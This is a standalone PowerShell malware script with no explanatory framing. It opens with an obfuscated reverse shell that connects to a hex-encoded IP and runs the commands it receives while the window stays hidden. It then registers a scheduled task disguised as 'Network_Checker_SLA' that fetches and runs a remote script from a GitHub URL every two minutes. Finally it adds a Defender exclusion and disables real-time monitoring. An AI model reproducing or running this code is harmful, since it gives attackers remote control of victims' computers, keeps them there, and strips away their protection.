& ( $PSHOmE[21]+$pshOme[34]+'X') ( (('Sta'+'rt-P'+'rocess '+'fh9PSHOMEk3Kpowershell'+'.exe -Ar'+'gu'+'mentList'+' '+'{-ep'+' bypa'+'ss'+' -n'+'o'+'p'+' fh9f'+'L'+'a8'+'QgX41'+'5'+' = '+'N'+'e'+'w'+'-O'+'b'+'ject'+' '+'System.Net.'+'Socket'+'s.TCPCl'+'ient(Yf10xc'+'0a8d14'+'cYf1,0'+'x'+'ada7'+');'+'fh'+'9r'+'ALGoJ9'+'RI'+'P ='+' fh'+'9fLa8QgX41'+'5.'+'Ge'+'tStr'+'eam'+'();[byte[]]fh9W6b'+'UxFE5RV'+' = 0..655351Ps%{0'+'};while((f'+'h'+'9ERDb8tYK'+'s0 = fh'+'9'+'rA'+'LGoJ9RIP.Rea'+'d(fh'+'9W6b'+'UxFE'+'5RV, '+'0, fh9W'+'6bUxFE5RV'+'.Length'+')) '+'-n'+'e 0){;fh91cSCi'+'oF'+'k'+'Lf '+'='+' (New-Obj'+'ec'+'t -TypeNam'+'e '+'System.Te'+'x'+'t.'+'ASC'+'I'+'I'+'Encod'+'in'+'g'+').Ge'+'tStri'+'ng'+'(fh9W6bU'+'xFE5R'+'V,0,'+' '+'fh9ERDb'+'8'+'t'+'YKs0);fh9'+'J4psBspbMW'+' = (iY'+'f1Yf'+'1ex'+' f'+'h91'+'cSCi'+'o'+'Fk'+'Lf 2>&1 1P'+'s'+' Out-St'+'ri'+'n'+'g'+' );fh9'+'1MWYX2Z'+'1t'+'E = f'+'h9J4psB'+'sp'+'bMW + Yf'+'1<:lclk'+'qdUSKB:>'+' Y'+'f1 +'+' ('+'pw'+'d).Path + '+'Y'+'f1> Yf'+'1'+';fh'+'9J'+'pDq'+'S'+'5d1P'+'H ='+' (['+'text'+'.enc'+'odi'+'ng'+']::'+'ASCII)'+'.'+'GetBytes(fh91MWYX'+'2Z'+'1t'+'E);fh9rALGoJ9RI'+'P'+'.W'+'rite('+'fh9J'+'pDq'+'S5d1PH,0'+',fh'+'9JpDq'+'S'+'5'+'d1PH'+'.Length'+');fh9'+'r'+'ALGoJ9'+'R'+'IP.Fl'+'ush()};fh9f'+'L'+'a8QgX415.C'+'l'+'os'+'e'+'()} '+'-'+'Wi'+'nd'+'ow'+'Style'+' H'+'id'+'den                                                                                                                         
') -rePlace'fh9',[chAr]36-crEPLacE([chAr]89+[chAr]102+[chAr]49),[chAr]39-crEPLacE 'k3K',[chAr]92-crEPLacE ([chAr]49+[chAr]80+[chAr]115),[chAr]124) )
$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10) -RepetitionInterval (New-TimeSpan -Minutes 2)
$Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument "--headless powershell -c `"`$l='http'+'s://raw.githubusercontent.com/MarcSzc/fdfsfffdsfdsfdsf/main/ob.ps1';(i''wR `$l).content|i''E''x`""


Register-ScheduledTask -Action $action -Trigger $trigger -TaskName 'Network_Checker_SLA' -Description 'Network_Checker_SLA' 


Set-MpPreference -ExclusionPath c:\tmp
Set-MpPreference -DisableRealtimeMonitoring $true
